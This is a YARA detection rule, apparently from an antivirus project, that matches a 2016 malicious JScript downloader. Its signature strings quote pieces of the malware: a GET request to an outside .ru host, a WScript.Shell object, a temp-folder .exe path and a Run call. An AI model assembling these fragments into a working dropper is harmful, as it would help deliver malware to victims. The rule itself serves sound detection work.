rule sig_20160330_3b903cfc430ef45398d375cbdfe9f502 {
  meta:
    description = "datamaliciousorder - file 20160330_3b903cfc430ef45398d375cbdfe9f502.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "a33db16f1ea013e934231ab22f035f0a6428275b351bc25513dfbd75ea29cc41"

  strings:
    $s1  = "V[U](\"GET\", \"http://zakaz-sharikov.ru/x9dslp\", false);" fullword ascii
    $s2  = "var DK = function NI() {return WScript[FX](\"WScript\"+\".Shell\");}(), VJ = 11;" fullword ascii
    $s3  = "function L0(OR, EZ){TW = TW * 1; return OR - EZ;};" fullword ascii
    $s4  = "if (V[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function L(){return RJ + \"\";};" fullword ascii
    $s6  = "function VB() {return DK[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"0NE0xWMBuGqXHmH.ex\" + \"e\";};" fullword ascii
    $s7  = "function B(JU){DK[\"Run\"](JU, TW, TW);};" fullword ascii
    $s8  = "function ES() {return ((Q == true) && (Q == LS)) ? 1 : TW;};" fullword ascii
    $s9  = "function FT()" fullword ascii
    $s10 = "return L0(L1, PT);" fullword ascii
    $s11 = "}while (HE);" fullword ascii
    $s12 = "function CG(){return FX;};" fullword ascii
    $s13 = "function Z(H0) {var TA = (1, 2, 3, 4, 5, H0); return TA;};" fullword ascii
    $s14 = "function S(){return 22;};" fullword ascii
    $s15 = "var CT = new this[\"Date\"]();" fullword ascii
    $s16 = "Q = true; " fullword ascii
    $s17 = "var Q = false;" fullword ascii
    $s18 = "LS = true; " fullword ascii
    $s19 = "var UZ = false;" fullword ascii
    $s20 = "var LS = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}